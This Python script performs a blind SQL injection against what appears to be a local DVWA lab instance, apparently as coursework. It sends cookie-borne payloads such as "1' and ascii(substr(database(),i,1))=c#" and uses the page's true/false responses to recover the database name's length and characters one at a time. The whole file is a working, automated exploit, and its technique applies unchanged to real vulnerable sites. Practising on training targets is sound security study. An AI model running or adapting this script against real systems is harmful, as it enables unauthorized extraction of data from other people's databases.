import requests
from bs4 import BeautifulSoup
from pathlib import Path


LIMIT = 100
PHPSESSID = "mrkmml3bsf05ik17m4u7du5gj7"
SECURITY = "high"
HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}

def get_db_name_len():
    db_size = 0
    while True:
        db_size += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/"
        burp_proxy = {"http": "http://127.0.0.1:8080",
                      "https": "https://127.0.0.1:8080"
                      }
        
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY, "id": f"1' and length(database())={db_size} #"}
        
        # response = requests.post(url, cookies=cookies, headers=header, proxies=burp_proxy)
        response = requests.post(url, cookies=cookies, headers=HEADER)
        
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return db_size
        if db_size >= 100:
            raise ValueError(f'Tried {db_size} time but table len not found')   
        
def get_db_name_char_ascii(digit):
    target_ascii = 96
    while True:
        target_ascii += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY, "id": f"1' and ascii(substr(database(),{digit},1))={target_ascii}#"}
        response = requests.post(url, cookies=cookies, headers=HEADER)
        
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return chr(target_ascii)
        if target_ascii > 122:
            raise ValueError(f'char not found on {digit}')


def get_db_ver(name_len):
    db_name = ""
    for idx in range(1, name_len + 1):
        db_name += get_db_name_char_ascii(idx)
    output_file = Path(__file__).with_name('db_name.log')
    fp = open(output_file,'w')
    fp.write(f"Jonghyeok Kim\n")
    fp.write(f"The length of DB name : {name_len}\n")
    fp.write(f"The name of DB: {db_name}\n")
    fp.close()
    return db_name

if __name__ == "__main__":
    db_name_len = get_db_name_len()
    print(db_name_len)
    db_name = get_db_ver(db_name_len)
    print(db_name)
    
    